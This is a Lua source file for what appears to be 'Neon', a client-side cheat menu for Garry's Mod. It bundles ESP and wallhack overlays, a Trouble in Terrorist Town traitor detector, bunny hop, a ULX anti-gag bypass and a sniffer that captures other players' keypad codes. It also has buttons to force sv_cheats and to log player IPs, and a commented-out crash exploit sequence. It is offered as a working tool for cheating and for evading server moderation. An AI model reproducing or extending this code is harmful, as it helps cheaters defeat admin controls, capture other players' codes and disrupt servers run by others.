hook.Add( "CreateMove", "StoredAngleRecalc2131", ReCalc55 )

function Calctest(ply, pos, angles, fov)
if propkill1 == 1 then 
local view = {} 
view.origin = pos
if GetViewEntity() == LocalPlayer() and propkill1 == 1 then 
view.angles = orA
end
view.fov = fov
return view
	end
end
hook.Add( "CalcView", "NegTin", Calctest )

function Throw125()
if LocalPlayer():GetCurrentCommand():KeyDown( IN_SPEED ) and propkill1 == 1 then
LocalPlayer():SetEyeAngles( Angle ( orA.p , orA.y , orA.r ) )
propkill1 = 0
	end
end
hook.Add( "Think", "ThrowProp125z", Throw125 )

----------------------------------------------------------------

timer.Simple( 3, function()
if ( gmod.GetGamemode().Name ) == "Trouble in Terrorist Town" then

local Traitors = {}
local TWeapons = { "weapon_ttt_knife", "weapon_ttt_c4" }
local TWeapons2 = { "weapon_ttt_push", "weapon_ttt_phammer" }
local TWeapons3 = { "weapon_ttt_sipistol", "weapon_ttt_flaregun" }
local TWeapons4 = { "(Disguise)", "weapon_ttt_radio" }
local UsedWeapons = {}
local MapWeapons = {}

function IsATraitor( ply )
for k, v in pairs( Traitors ) do
if v == ply then
return true
else
return false
		end
	end
end

timer.Create( tostring( math.random( 1, 1000 ) ), 0.8, 0, function()
if GetConVarNumber( "Neon_Traitor" ) &gt;= 1 then
if !IsATraitor( ply ) then 
for k, v in pairs( ents.FindByClass( "player" ) ) do 
if ValidEntity( v ) then
if (!v:IsDetective()) then
if v:Team() ~= TEAM_SPECTATOR then

for wepk, wepv in pairs( TWeapons || TWeapons2 || Tweapons3 || TWeapons4 ) do
for entk, entv in pairs( ents.FindByClass( wepv ) ) do
if ValidEntity( entv ) then
cookie.Set( entv, 100 - wepk )
if !table.HasValue( UsedWeapons, cookie.GetNumber( entv ) ) then
if !table.HasValue( MapWeapons, cookie.GetNumber( entv ) ) then
local EntPos = ( entv:GetPos() - Vector(0,0,35) )


if entv:GetClass() == wepv then
if v:GetPos():Distance( EntPos ) &lt;= 1 then
table.insert( Traitors, v )
if !table.HasValue( UsedWeapons, cookie.GetNumber( entv ) ) then
table.insert( UsedWeapons, cookie.GetNumber( entv ) )
else
if !table.HasValue( MapWeapons, cookie.GetNumber( entv ) ) then
table.insert( MapWeapons, cookie.GetNumber( entv ) )
															end
														end
													end
												end
											end
										end
									end
								end
							end
						end
					end
				end
			end
		end
	end
end )

hook.Add( "HUDPaint", "DrawESPTraitor", function()
if GetConVarNumber( "Neon_Traitor" ) &gt;=1 then
for k, v in pairs( Traitors ) do
if ValidEntity( v ) then
if v:Team() ~= TEAM_SPECTATOR then
if v:Team() ~= LocalPlayer() then
if ( !v:IsDetective() ) then
local PlyESPPos = ( v:GetPos() + Vector( 0, 0, 65 ) ):ToScreen()
draw.SimpleText( "*Traitor*", "TabLarge", PlyESPPos.x, PlyESPPos.y - 13, Color( 255, 0, 0, 255 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
						end
					end
				end
			end
		end
	end
end )

concommand.Add( "Neon_SayTraitors", function()
for k, v in pairs( Traitors ) do
if v:Team() ~= TEAM_SPECTATOR then
LocalPlayer():ConCommand( "say " .. v:Nick() .. "is a Traitor, and I can prove it!" )
		end
	end
end )

hook.Add( "TTTPrepareRound", "ResetItAll", function()
timer.Simple( 2, function()
for k, v in pairs( Traitors ) do
table.remove( Traitors, k )
Traitors = {}
end
for k, v in pairs( UsedWeapons ) do
table.remove( UsedWeapons, k )
UsedWeapons = {}
				end 
for k, v in pairs( MapWeapons ) do
table.remove( MapWeapons, k )
MapWeapons = {}
				end 
			end ) 
		end )
	end 
end )

----------------------------------------------------------------

local RayOn = false
local AllMats = {}
local allcolors = {}
local FSetColor = _R.Entity.SetColor
local FSetMat = _R.Entity.SetMaterial
local FGetMat = _R.Entity.GetMaterial
local repmat = CreateClientConVar("falco_xraymaterial", "mat2", true, false)

local function TogglePoKiRay()
	if RayOn then
		surface.PlaySound("buttons/button19.wav") 
		for k,v in pairs(ents.GetAll()) do
		if ValidEntity( v ) then
			FSetMat(v, AllMats[v])
			local z = allcolors[v]
			if z and type(z) == "table" then
				FSetColor(v, z.r, z.g, z.b, z.a)
			else 
				FSetColor(v, 255,255,255,255)
			end
		end
		allcolors = {}
		end
	else
		for k,v in pairs(ents.GetAll()) do
		if ValidEntity( v ) then
			ExecFRayOnce(v)
			end
		end
		surface.PlaySound("buttons/button1.wav") 
	end
	RayOn = not RayOn
end
concommand.Add("falco_xray", TogglePoKiRay)

function ExecFRayOnce(v)
if ValidEntity( v ) then
	local r,g,b,a = v:GetColor()
	local class = v:GetClass()
	local low = string.lower(class)
	if v:IsNPC() and (r ~= 0 or g ~= 0 or b ~= 255 or a ~= 255) then
		allcolors[v] = Color(r,g,b,a)
		FSetColor(v, 0, 0, 255, 255)
	elseif v:IsWeapon() and (r ~= 140 or g ~= 0 or b ~= 255 or a ~= 255) then
		allcolors[v] = Color(r,g,b,a)
		FSetColor(v, 140, 0, 255, 255)
	elseif string.find(class, "ghost") and a ~= 100 then
		allcolors[v] = Color(r,g,b,a)
		FSetColor(v, 255,255,255,100)
	elseif (class == "drug_lab" or class == "money_printer") and (r ~= 255 or g ~= 0 or b ~= 100 or a ~= 50) then
		allcolors[v] = Color(r,g,b,a)
		FSetColor(v, 255, 0, 100, 50)
	elseif not v:IsPlayer() and not v:IsNPC() and class ~= "prop_physics" and class ~= "prop" and class ~= "drug_lab" and class ~= "money_printer" and not v:IsWeapon() and class ~= "viewmodel" and not string.find(class, "ghost") and ( r ~= 255 or g ~= 200 or b ~= 0 or a ~= 100) then
		allcolors[v] = Color(r,g,b,a)
		FSetColor(v, 255, 200, 0, 100)
	end
	if class ~= "viewmodel" and FGetMat(v) ~= repmat:GetString() and class ~= "func_door" and class ~= "func_door_rotating" and class ~= "prop_door_rotating" and not string.find(class, "ghost") then
		AllMats[v] = FGetMat(v)
		FSetMat(v, repmat:GetString())
		end
	end
end

function DoPoKiRay()
	if not RayOn then return end
	for k,v in pairs(ents.FindByClass("prop_physics")) do
		if ValidEntity(v) then
			FSetColor(v,50, 255, 50, 40)
			FSetMat(v, repmat:GetString())
		end
	end
	
	for k,v in pairs(ents.FindByClass("prop")) do
		if ValidEntity(v) then
			FSetColor(v,50, 255, 50, 40)
			FSetMat(v, repmat:GetString())
		end
	end
	
	for k,v in pairs(player.GetAll()) do
		if ValidEntity(v) then
			FSetColor(v,255,0,0,255)
			FSetMat(v, repmat:GetString())
		end
	end
end 
hook.Add( "RenderScene", "PoKiRay", DoPoKiRay)


----------------------------------------------------------------

function BHOP()
if GetConVarNumber( "Neon_Bhop" ) &gt;= 1 then
if input.IsKeyDown( KEY_SPACE ) then
if LocalPlayer():IsOnGround() then
RunConsoleCommand( "+jump" )
timer.Create( "Bhop", 0.01, 0, function() RunConsoleCommand("-jump") end )
		end
	end
end
if GetConVarNumber( "Neon_ULXAntiGag" ) &gt;= 1 then
if( ulx &amp;&amp; ulx.gagUser ) then
			ulx.gagUser( false )
		end
	end
end
hook.Add( "Think", "NeonBHOP", BHOP )

concommand.Add( "Neon_ForceCheats", function()
Ne.SetTCVar( "sv_cheats", "1" )
end )

----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------

function FindDaPass()
if GetConVarNumber( "Neon_KeypadHack" ) &gt;= 1 then
		--------Setup----------
	for _, p in pairs( player.GetAll() ) do
	local tr = p:GetEyeTraceNoCursor()
	if ( ( tr.StartPos - tr.HitPos ):Length() &lt; 32 ) then
	local e = tr.Entity
	if ( e:IsValid() ) then
	if ( e:GetClass() == "sent_keypad" || e:GetClass() == "sent_keypad_adv" || e:GetClass() == "sent_keypad_wire") then
	if ( e:GetNetworkedBool("Hacked") != true ) then 
	//////////////////////
	////////Non Secure
	////////////////////
	if ( e:GetNetworkedBool("keypad_secure") == false ) then
	if ( e:GetNWBool( "keypad_access" ) &amp;&amp; e:GetNWBool( "keypad_showaccess" ) ) then
	e.Password = e:GetNWInt( "keypad_num" )
	end
	/////////////////////////////
	////////Secure Keypads
	////////////////////////////
	else
	local pos = e:WorldToLocal(tr.HitPos)
		--------Code-----------
		local CurNum = e:GetNetworkedInt("keypad_num")
		local access = e:GetNetworkedBool("keypad_access")
		if( e.Num == nil) then e.Num = 0 end
		/////////////////////////////
		//////Success!
		////////////////////////////
		if(access == true &amp;&amp; CurNum != 0) then
		e:SetNetworkedBool("Hacked", true)
		e.Password = e.Num
		end
		/////////////////////////////
		//////Success!
		////////////////////////////
		if(CurNum == 0 &amp;&amp; e.Num != 0) then
		e.Num = 0
		end
		/////////////////////
		///////One
		///////////////////////////
		if( CurNum != 0 &amp;&amp; CurNum &gt; e.Num ) then
		if(pos.y &gt; -2.1948 &amp;&amp; pos.y &lt; -0.9932 &amp;&amp; pos.z &lt; -0.0075 &amp;&amp; pos.z &gt; -1.2929) then
		e.Num = tonumber(e.Num.."1")
		print(e.Num)
		//////////////////////////
		/////Two
		//////////////////////////
		elseif(pos.y &gt; -0.5865 &amp;&amp; pos.y &lt; 0.6369 &amp;&amp; pos.z &lt; -0.0039 &amp;&amp; pos.z &gt; -1.2509) then
		e.Num = tonumber(e.Num.."2")
		print(e.Num)
		//////////////////////////
		/////Three
		//////////////////////////
		elseif(pos.y &gt; 1.0185 &amp;&amp; pos.y &lt; 2.2451 &amp;&amp; pos.z &lt; -0.0205 &amp;&amp; pos.z &gt; -1.2954) then
		e.Num = tonumber(e.Num.."3")
		print(e.Num)
		//////////////////////////
		/////Four
		//////////////////////////
		elseif(pos.y &gt; -2.1992 &amp;&amp; pos.y &lt; -0.9697 &amp;&amp; pos.z &lt; -1.6083 &amp;&amp; pos.z &gt; -2.8945) then
		e.Num = tonumber(e.Num.."4")
		print(e.Num)
		//////////////////////////
		/////Five
		//////////////////////////
		elseif(pos.y &gt; -0.5893 &amp;&amp; pos.y &lt; 0.6437 &amp;&amp; pos.z &lt; -1.6010 &amp;&amp; pos.z &gt; -2.8989) then
		e.Num = tonumber(e.Num.."5")
		print(e.Num)
		//////////////////////////
		/////Six
		//////////////////////////
		elseif(pos.y &gt; 1.0065 &amp;&amp; pos.y &lt; 2.2297 &amp;&amp; pos.z &lt; -1.6031 &amp;&amp; pos.z &gt; -2.8992) then
		e.Num = tonumber(e.Num.."6")
		print(e.Num)
		//////////////////////////
		/////Seven
		//////////////////////////
		elseif(pos.y &gt; -2.1958 &amp;&amp; pos.y &lt; -0.9575 &amp;&amp; pos.z &lt; -3.3015 &amp;&amp; pos.z &gt; -4.5483) then
		e.Num = tonumber(e.Num.."7")
		print(e.Num)
		//////////////////////////
		/////Eight
		//////////////////////////
		elseif(pos.y &gt; -0.5899 &amp;&amp; pos.y &lt; 0.6464 &amp;&amp; pos.z &lt; -3.3108 &amp;&amp; pos.z &gt; -4.5422) then
		e.Num = tonumber(e.Num.."8")
		print(e.Num)
		//////////////////////////
		/////Nine
		//////////////////////////
		elseif(pos.y &gt; 1.0023 &amp;&amp; pos.y &lt; 2.2230 &amp;&amp; pos.z &lt; -3.3003 &amp;&amp; pos.z &gt; -4.5493) then
		e.Num = tonumber(e.Num.."9")
		print(e.Num)
		------------------------
									end
								end
							end
						end
					end
				end
			end
		end
	end
end
hook.Add( "Think", "FindDaPassword", FindDaPass )

function DrawKeypadESP()
if GetConVarNumber( "Neon_KeypadHack" ) &gt;= 1 then
----------Setup---
	for _, e in pairs( ents.GetAll() ) do
	if ( ValidEntity( e ) ) then
	if ( e:GetClass() == "sent_keypad" || e:GetClass() == "sent_keypad_wire" ) then
-----Vars----
local p = e:GetPos():ToScreen()
local keypos = Vector( p.x, p.y, 0 )
local dif = tonumber(e:GetPos():Distance(LocalPlayer():GetPos()))
-------Render------
if( e.Password == nil &amp;&amp; e:GetNWBool("keypad_secured") == false ) then
------------No Pass----------
if( dif &gt; 500 ) then
draw.RoundedBox( 4, keypos.x - 5, keypos.y - 5, (10 / (10*dif))*10, (10 / (10*dif))*10, Color(255,0,0,200) )
else
surface.SetFont( "Default" )
local w = surface.GetTextSize( "Tampering..." ) + 16
draw.WordBox( 6, keypos.x - ( w / 2 ), keypos.y - ( w / 2 ), "Tampering...", "Default", Color(255,0,0,200), Color(255,255,255,255) )
end
---------Has Pass-------------
else
if( dif &gt; 500 ) then
draw.RoundedBox( 4, keypos.x - 5, keypos.y - 5, ( 10 / ( 10 * dif ) ) * 10, ( 10 / (10*dif) )*10, Color(0,255,0,200) )
else
surface.SetFont( "Default" )
local w = surface.GetTextSize( tostring(e.Password) ) + 16
draw.WordBox( 6, keypos.x - ( w / 2 ), keypos.y - ( w / 2 ), tostring(e.Password), "Default", Color(0,255,0,200), Color(255,255,255,255) )
						end
					end
				end
			end
		end
	end
end

hook.Add( "HUDPaint", "KeypadESP", DrawKeypadESP )

local dlight = DynamicLight()

hook.Add( "Think", "dlight1", function()
if GetConVarNumber( "Neon_DynamicLight" ) &gt;=1 then
if (dlight) then
dlightcolor = Color( 255, 255, 255, 255 )
dlight.Pos = LocalPlayer():GetPos()
dlight.r = dlightcolor.r
dlight.g = dlightcolor.g 
dlight.b = dlightcolor.b
dlight.Brightness = 5
dlight.Size = GetConVarNumber( "Neon_DynamicLightSize" )
dlight.Decay = 0 
dlight.DieTime = CurTime() + 0.1
		end
	end
end )

----------------------------------------------------------------

//Derma Menu
function NeonMenu()

Panel = vgui.Create( "DPropertySheet" )
Panel:SetPos( ScrW() / 2 - 185, ScrH() / 2 - 133 )
Panel:SetSize( 380, 267 )
Panel:MakePopup()

local T1 = vgui.Create( "DLabel", _Pan )
T1:SetPos( 0, 0 )
T1:SetText( "" )

local T1B = vgui.Create( "DImage", T1 )
T1B:SetMaterial( Material( "NeonHack/NeonBG.vtf" ) )
T1B:SetPos( 0, 0 )
T1B:SetSize( 375, 262 )

local ESPL = vgui.Create( "DLabel", T1 )
ESPL:SetPos( 12, 25 )
ESPL:SetText( "-ESP " )
ESPL:SetTextColor( Color( 255, 150, 0, 255 ) )
ESPL:SizeToContents()

local ESP2L = vgui.Create( "DLabel", T1 )
ESP2L:SetPos( 37, 25 )
ESP2L:SetText( "+ WallHack-" )
ESP2L:SetTextColor( Color( 255, 0, 204, 255 ) )
ESP2L:SizeToContents()

--Player ESP CheckBox
local PCheckBox = vgui.Create( "DCheckBox", T1 )
PCheckBox:SetPos( 12, 50 )
PCheckBox:SetConVar( "Neon_PlayerESP" )

local PCheckBoxL = vgui.Create( "DLabel", T1 )
PCheckBoxL:SetPos( 30, 50 )
PCheckBoxL:SetText( "Player ESP" )
PCheckBoxL:SetTextColor( Color( 225, 150, 0, 225 ) )
PCheckBoxL:SizeToContents()

--PlayerHealth ESP CheckBox
local PHCheckBox = vgui.Create( "DCheckBox", T1 )
PHCheckBox:SetPos( 12, 75 )
PHCheckBox:SetConVar( "Neon_PlayerESP_Health" )

local NCheckBoxL = vgui.Create( "DLabel", T1 )
NCheckBoxL:SetPos( 30, 75 )
NCheckBoxL:SetText( "Player Health ESP" )
NCheckBoxL:SetTextColor( Color( 225, 150, 0, 225 ) )
NCheckBoxL:SizeToContents()

--Show Dead
local SDCheckBox = vgui.Create( "DCheckBox", T1 )
SDCheckBox:SetPos( 12, 100 )
SDCheckBox:SetConVar( "Neon_PlayerESP_ShowAll" )

local SDCheckBoxL = vgui.Create( "DLabel", T1 )
SDCheckBoxL:SetPos( 30, 100 )
SDCheckBoxL:SetText( "Show Dead" )
SDCheckBoxL:SetTextColor( Color( 225, 150, 0, 225 ) )
SDCheckBoxL:SizeToContents()

//Player Box
local WHBCheckBox = vgui.Create( "DCheckBox", T1 )
WHBCheckBox:SetPos( 12, 125 )
WHBCheckBox:SetConVar( "Neon_PlayerBox" )

local WHBCheckBoxL = vgui.Create( "DLabel", T1 )
WHBCheckBoxL:SetPos( 30, 125 )
WHBCheckBoxL:SetText( "Player Box" )
WHBCheckBoxL:SetTextColor( Color( 225, 150, 0, 225 ) )
WHBCheckBoxL:SizeToContents()

--NPC ESP
local NPCCheckBox = vgui.Create( "DCheckBox", T1 )
NPCCheckBox:SetPos( 12, 150 )
NPCCheckBox:SetConVar( "Neon_NPCESP" )

local NPCheckBoxL = vgui.Create( "DLabel", T1 )
NPCheckBoxL:SetPos( 30, 150 )
NPCheckBoxL:SetText( "NPC ESP" )
NPCheckBoxL:SetTextColor( Color( 225, 150, 0, 225 ) )
NPCheckBoxL:SizeToContents()

------------------------------------------------
------------------------------------------------

--[[
local WHL = vgui.Create( "DLabel", T1 )
WHL:SetPos( 12, 150 )
WHL:SetText( "-WallHack-" )
WHL:SetTextColor( Color( 255, 51, 204, 255 ) )
WHL:SizeToContents()]]--

--Player FullBright
local WHCheckBox = vgui.Create( "DCheckBox", T1 )
WHCheckBox:SetPos( 12, 175 )
WHCheckBox:SetConVar( "Neon_PlayerFullBright" )

local WHCheckBoxL = vgui.Create( "DLabel", T1 )
WHCheckBoxL:SetPos( 30, 175 )
WHCheckBoxL:SetText( "Player Model" )
WHCheckBoxL:SetTextColor( Color( 255, 0, 204, 255 ) )
WHCheckBoxL:SizeToContents()

--Player WireFrame
local WFHCheckBox = vgui.Create( "DCheckBox", T1 )
WFHCheckBox:SetPos( 12, 200 )
WFHCheckBox:SetConVar( "Neon_PlayerWireFrame" )
WFHCheckBox.OnChange = function()
if GetConVarNumber( "Neon_PlayerWireFrame" ) &gt;= 1 then
Ne.SetTCVar( "r_drawothermodels", "2" )
else
Ne.SetTCVar( "r_drawothermodels", "1" )
	end
end

local WFHCheckBoxL = vgui.Create( "DLabel", T1 )
WFHCheckBoxL:SetPos( 30, 200 )
WFHCheckBoxL:SetText( "Player Wireframe" )
WFHCheckBoxL:SetTextColor( Color( 255, 0, 204, 255 ) )
WFHCheckBoxL:SizeToContents()

------------------------------------------------
------------------------------------------------

//DarkRP
local RPL = vgui.Create( "DLabel", T1 )
RPL:SetPos( 192, 25 ) --192, 25
RPL:SetText( "-RolePlay " )
RPL:SetTextColor( Color( 0, 204, 255, 255 ) )
RPL:SizeToContents()

local RP2L = vgui.Create( "DLabel", T1 )
RP2L:SetPos( 240, 25 ) --192, 25
RP2L:SetText( "+ Environment-" )
RP2L:SetTextColor( Color( 255, 204, 102, 255 ) )
RP2L:SizeToContents()

--MoneyPrinter
local RPCheckBox = vgui.Create( "DCheckBox", T1 )
RPCheckBox:SetPos( 192, 50 )
RPCheckBox:SetConVar( "Neon_MoneyPrinterESP" )

local RPLCheckBoxL = vgui.Create( "DLabel", T1 )
RPLCheckBoxL:SetPos( 210, 50 ) --210, 50
RPLCheckBoxL:SetText( "Money Printer" )
RPLCheckBoxL:SetTextColor( Color( 0, 204, 255, 255 ) )
RPLCheckBoxL:SizeToContents()

--Money
local MRPCheckBox = vgui.Create( "DCheckBox", T1 )
MRPCheckBox:SetPos( 192, 75 )
MRPCheckBox:SetConVar( "Neon_MoneyESP" )

local MRPLCheckBoxL = vgui.Create( "DLabel", T1 )
MRPLCheckBoxL:SetPos( 210, 75 )
MRPLCheckBoxL:SetText( "Money" )
MRPLCheckBoxL:SetTextColor( Color( 0, 204, 255, 255 ) )
MRPLCheckBoxL:SizeToContents()

--Shipment
local SRPCheckBox = vgui.Create( "DCheckBox", T1 )
SRPCheckBox:SetPos( 192, 100 )
SRPCheckBox:SetConVar( "Neon_ShipmentESP" )

local SRPLCheckBoxL = vgui.Create( "DLabel", T1 )
SRPLCheckBoxL:SetPos( 210, 100 )
SRPLCheckBoxL:SetText( "Shipment" )
SRPLCheckBoxL:SetTextColor( Color( 0, 204, 255, 255 ) )
SRPLCheckBoxL:SizeToContents()

--Weapon
local WEPONRPCheckBox = vgui.Create( "DCheckBox", T1 )
WEPONRPCheckBox:SetPos( 192, 125 )
WEPONRPCheckBox:SetConVar( "Neon_WeaponsESP" )

local WEPONRPLCheckBoxL = vgui.Create( "DLabel", T1 )
WEPONRPLCheckBoxL:SetPos( 210, 125 )
WEPONRPLCheckBoxL:SetText( "Weapon" )
WEPONRPLCheckBoxL:SetTextColor( Color( 0, 204, 255, 255 ) )
WEPONRPLCheckBoxL:SizeToContents()

---------------------------------------------------------

--Gray
local GCheckBox = vgui.Create( "DCheckBox", T1 )
GCheckBox:SetPos( 192, 150 )
GCheckBox:SetConVar( "Neon_Gray" )
GCheckBox.OnChange = function()
if GetConVarNumber( "Neon_Gray" ) &gt;= 1 then
Ne.SetTCVar( "mat_fullbright", "2" )
else
Ne.SetTCVar( "mat_fullbright", "0" )
	end
end

local GCheckBoxL = vgui.Create( "DLabel", T1 )
GCheckBoxL:SetPos( 210, 150 )
GCheckBoxL:SetText( "Gray" )
GCheckBoxL:SetTextColor( Color( 255, 204, 102, 255 ) )
GCheckBoxL:SizeToContents()

--WireFrame

local WWCheckBox = vgui.Create( "DCheckBox", T1 )
WWCheckBox:SetPos( 192, 168 )
WWCheckBox:SetConVar( "Neon_WorldWireFrame" )
WWCheckBox.OnChange = function()
if GetConVarNumber( "Neon_WorldWireFrame" ) &gt;= 1 then
Ne.SetTCVar( "mat_wireframe", "2" )
else
Ne.SetTCVar( "mat_wireframe", "0" )
	end
end

local WWCheckBoxL = vgui.Create( "DLabel", T1 )
WWCheckBoxL:SetPos( 210, 168 )
WWCheckBoxL:SetText( "World WireFrame" )
WWCheckBoxL:SetTextColor( Color( 255, 204, 102, 255 ) )
WWCheckBoxL:SizeToContents()

--DynamicLight

local DynamicLightCheckBox = vgui.Create( "DCheckBox", T1 )
DynamicLightCheckBox:SetPos( 192, 186 ) --192, 200
DynamicLightCheckBox:SetConVar( "Neon_DynamicLight" )

local DynamicLightCheckBoxL = vgui.Create( "DLabel", T1 )
DynamicLightCheckBoxL:SetPos( 210, 186 ) --210, 200
DynamicLightCheckBoxL:SetText( "Dynamic Light" )
DynamicLightCheckBoxL:SetTextColor( Color( 255, 204, 102, 255 ) )
DynamicLightCheckBoxL:SizeToContents()

local NumSlider = vgui.Create( "DNumSlider", T1 )
NumSlider:SetPos( 192, 198 )
NumSlider:SetWide( 150 )
NumSlider:SetText( "DynamicLight Size" )
NumSlider:SetMin( 0 ) -- Minimum number of the slider
NumSlider:SetMax( 500 ) -- Maximum number of the slider
NumSlider:SetDecimals( 0 ) -- Sets a decimal. Zero means it's a whole number
NumSlider:SetMouseInputEnabled( true )
NumSlider:SetConVar( "Neon_DynamicLightSize" ) -- Set the convar

--------------------------------------------------------
--------------------------------------------------------

local T2 = vgui.Create( "DLabel", _Pan )
T2:SetPos( 0, 0 )
T2:SetText( "" )

local T2BGB = vgui.Create( "DImage", T2 )
T2BGB:SetMaterial( Material( "NeonHack/NeonBG.vtf" ) )
T2BGB:SetPos( 0, 0 )
T2BGB:SetSize( 375, 262 )

//Misc
local M2LL = vgui.Create( "DLabel", T2 )
M2LL:SetPos( 12, 25 )
M2LL:SetText( "-Misc-" )
M2LL:SetTextColor( Color( 255, 0, 0, 255 ) )
M2LL:SizeToContents()

--Bhop
local BHOPCheckBoxL = vgui.Create( "DLabel", T2 )
BHOPCheckBoxL:SetPos( 30, 50 )
BHOPCheckBoxL:SetText( "Bunny Hop" )
BHOPCheckBoxL:SetTextColor( Color( 255, 0, 0, 255 ) )
BHOPCheckBoxL:SizeToContents()

local BHOPCheckBox = vgui.Create( "DCheckBox", T2 )
BHOPCheckBox:SetPos( 12, 50 )
BHOPCheckBox:SetConVar( "Neon_Bhop" )

--ULX Anti-Gag
local ULXCheckBoxL = vgui.Create( "DLabel", T2 )
ULXCheckBoxL:SetPos( 30, 75 )
ULXCheckBoxL:SetText( "ULX Anti-Gag" )
ULXCheckBoxL:SetTextColor( Color( 255, 0, 0, 255 ) )
ULXCheckBoxL:SizeToContents()

local ULXCheckBox = vgui.Create( "DCheckBox", T2 )
ULXCheckBox:SetPos( 12, 75 )
ULXCheckBox:SetConVar( "Neon_ULXAntiGag" )

--TraitorHack
local TraitorCheckBox = vgui.Create( "DCheckBox", T2 )
TraitorCheckBox:SetPos( 12, 100 )
TraitorCheckBox:SetConVar( "Neon_Traitor" )

local TraitorCheckBoxL = vgui.Create( "DLabel", T2 )
TraitorCheckBoxL:SetPos( 30, 100 )
TraitorCheckBoxL:SetText( "[TH]Core (TraitorHack)" )
TraitorCheckBoxL:SetTextColor( Color( 255, 0, 0, 255 ) )
TraitorCheckBoxL:SizeToContents()

--KeyPad Hack
local KeypadCheckBox = vgui.Create( "DCheckBox", T2 )
KeypadCheckBox:SetPos( 12, 125 )
KeypadCheckBox:SetConVar( "Neon_KeypadHack" )

local KeypadCheckBoxL = vgui.Create( "DLabel", T2 )
KeypadCheckBoxL:SetPos( 30, 125 )
KeypadCheckBoxL:SetText( "Keypad Hack [Experimental]" )
KeypadCheckBoxL:SetTextColor( Color( 255, 0, 0, 255 ) )
KeypadCheckBoxL:SizeToContents()

--TTT C4 Detection
local KeypadCheck3Box = vgui.Create( "DCheckBox", T2 )
KeypadCheck3Box:SetPos( 12, 150 )
KeypadCheck3Box:SetConVar( "Neon_C4Detection" )

local KeypadCheck3BoxL = vgui.Create( "DLabel", T2 )
KeypadCheck3BoxL:SetPos( 30, 150 )
KeypadCheck3BoxL:SetText( "[TTT] C4 Detection" )
KeypadCheck3BoxL:SetTextColor( Color( 255, 0, 0, 255 ) )
KeypadCheck3BoxL:SizeToContents()

--LogPlayerIP's
local KeypadCheck4Box = vgui.Create( "DCheckBox", T2 )
KeypadCheck4Box:SetPos( 12, 175 )
KeypadCheck4Box:SetConVar( "Neon_LogPlayerIPs" )

local KeypadCheck4BoxL = vgui.Create( "DLabel", T2 )
KeypadCheck4BoxL:SetPos( 30, 175 )
KeypadCheck4BoxL:SetText( "Log/Show Player IP's" )
KeypadCheck4BoxL:SetTextColor( Color( 255, 0, 0, 255 ) )
KeypadCheck4BoxL:SizeToContents()

--MuteAll
local MUTEB = vgui.Create( "DButton", T2 )
MUTEB:SetPos( 12, 200 )
MUTEB:SetSize( 75, 25 )
MUTEB:SetText( "MuteAll" )
MUTEB.DoClick = function()
muteall = !muteall
for k, v in pairs( player.GetAll() ) do
if v ~= LocalPlayer() then
if v:GetFriendStatus() ~= "friend" then
if muteall then
v:SetMuted( true )
else
v:SetMuted( false )
				end
			end
		end
	end
end

-------------------------------------------

//Exploits
local EXPLOITL = vgui.Create( "DLabel", T2 )
EXPLOITL:SetPos( 192, 25 ) --192, 25
EXPLOITL:SetText( "-Exploits-" )
EXPLOITL:SetTextColor( Color( 255, 150, 0, 255 ) )
EXPLOITL:SizeToContents()

--[[
local EXPLOITB = vgui.Create( "DButton", T2 )
EXPLOITB:SetPos( 192, 50 )
EXPLOITB:SetSize( 75, 25 )
EXPLOITB:SetText( "Material Crash" )
EXPLOITB.DoClick = function()
LocalPlayer():ChatPrint( "*WARNING: Make sure Falco Xray is TURNED OFF*" )
LocalPlayer():ChatPrint( "*NOTE: This may not work the first time!*" )
timer.Simple( 3, function()
RunConsoleCommand( "falco_xray" )
timer.Simple( 0.2, function()
LocalPlayer():ConCommand( "gm_spawn models/props_c17/Lockers001a.mdl" )
timer.Simple( 0.2, function()
RunConsoleCommand( "-Neon_Menu" )
timer.Simple( 0.2, function()
LocalPlayer():ConCommand( "material_override effects/ar2_altfire1" )
timer.Simple( 0.2, function()
RunConsoleCommand( "tool_material" )
timer.Simple( 0.2, function()
RunConsoleCommand( "+attack" )
timer.Simple( 0.3, function()
RunConsoleCommand( "+attack" )
timer.Simple( 0.2, function()
RunConsoleCommand( "-attack" )
timer.Simple( 2, function()
RunConsoleCommand( "undo" )
timer.Simple( 0.5, function()
RunConsoleCommand( "falco_xray" )
										end )
									end )
								end )
							end )
						end )
					end )
				end )
			end )
		end )
	end )
end
]]--

local ForceCheatsB = vgui.Create( "DButton", T2 )
ForceCheatsB:SetPos( 192, 50 )
ForceCheatsB:SetSize( 95, 25 )
ForceCheatsB:SetText( "Force Cheats" )
ForceCheatsB.DoClick = function()
cheats = !cheats
if cheats then
Ne.SetTCVar( "sv_cheats", "1" )
LocalPlayer():ChatPrint( "Forced sv_cheats to 1." )
else
Ne.SetTCVar( "sv_cheats", "0" )
LocalPlayer():ChatPrint( "Forced sv_cheats to 0." )
	end
end

---------------------------------------------------------
---------------------------------------------------------

local T3 = vgui.Create( "DLabel", _Pan )
T3:SetPos( 0, 0 )
T3:SetText( "" )

local T3B = vgui.Create( "DImage", T3 )
T3B:SetMaterial( Material( "NeonHack/NeonBG.vtf" ) )
T3B:SetPos( 0, 0 )
T3B:SetSize( 375, 262 )

--Nikes
local NikesSpeed = vgui.Create( "DNumSlider", T3 )
NikesSpeed:SetText( "SH Speed" )
NikesSpeed:SetPos( 12, 25 )
NikesSpeed:SetMinMax( -15, 10 )
NikesSpeed:SetWide( 125 )
NikesSpeed:SetMouseInputEnabled( true )
NikesSpeed:SetValue( math.Round( GetConVarNumber( "Neon_NikeSpeed" ) ) ) 
NikesSpeed:SetConVar( "Neon_NikeSpeed" )

--HostFrameRate
local HOSTCheckBox = vgui.Create( "DCheckBox", T3 )
HOSTCheckBox:SetPos( 12, 75 )
HOSTCheckBox:SetConVar( "Neon_HostFrameRate" )

local HOSTCheckBoxL = vgui.Create( "DLabel", T3 )
HOSTCheckBoxL:SetPos( 30, 75 )
HOSTCheckBoxL:SetText( "HostFrameRate" )
HOSTCheckBoxL:SetTextColor( Color( 0, 255, 0, 255 ) )
HOSTCheckBoxL:SizeToContents()

--HostTimeScale
local HOSTCheckBox = vgui.Create( "DCheckBox", T3 )
HOSTCheckBox:SetPos( 12, 100 )
HOSTCheckBox:SetConVar( "Neon_HostTimeScale" )

local HOSTCheckBoxL = vgui.Create( "DLabel", T3 )
HOSTCheckBoxL:SetPos( 30, 100 )
HOSTCheckBoxL:SetText( "HostTimeScale" )
HOSTCheckBoxL:SetTextColor( Color( 0, 255, 0, 255 ) )
HOSTCheckBoxL:SizeToContents()

